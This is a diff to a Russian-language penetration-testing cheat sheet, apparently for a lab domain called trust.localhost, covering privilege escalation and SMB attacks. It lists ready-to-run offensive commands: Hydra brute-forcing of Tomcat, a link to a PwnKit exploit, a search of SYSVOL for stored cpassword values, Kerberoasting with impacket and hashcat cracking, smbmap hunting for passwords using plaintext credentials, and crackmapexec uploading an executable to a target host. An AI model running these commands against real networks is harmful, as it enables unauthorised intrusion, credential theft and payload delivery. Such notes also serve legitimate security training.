@@ -65,10 +65,20 @@ hydra -L tomcat_user.txt -P tomcat_pass.txt -f alic.trust.localhost -s 7012 http
 
 
 ## Повышение привилегий
-**Linux** pwnkit --  https://github.com/PwnFunction/CVE-2021-4034 
+
+**Linux** 
+
+pwnkit --  https://github.com/PwnFunction/CVE-2021-4034 
+
 **AD** 
-```findstr /S /I cpassword \\domain.trust.localhost\sysvol\vestik\policies\*.xml```
+
+```
+findstr /S /I cpassword \\domain.trust.localhost\sysvol\vestik\policies\*.xml
+
+```
+
 **AD** 
+
 ```
 python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 172.16.1.1 trust.localhost/ptuser -request
 hashcat -m 13100 --force <TGSs_file> <passwords_file>
@@ -78,10 +88,16 @@ for i in $(find -name '*.txt'); do hashcat -m 13100 --force tgt_ticket.txt "$i";
 
 
 ## SMB
-smbmap
+smbmap && crackmapexec
 
 ```
 smbmap -u shut -p nik123 -H alloc.trust.localhost -d trust.localhost (-q -R --depth 5 -A 'passw' --exclude ADMIN$ IPC$ C$ --host-file hosts.txt)
+crackmapexec smb inv1.trust.localhost -u shut -p nik123 -d trust.localhost --put-file k1.exe  \\k1.exe
+```
+
+Монтирование шары:
+```
+sudo apt install cifs-utils && sudo mkdir /mnt/win_share && sudo mount -t cifs -o username=shut //nas.trust.localhost/WORK/logs /mnt/win_share
 ```
 
 ## Получить хеш файла
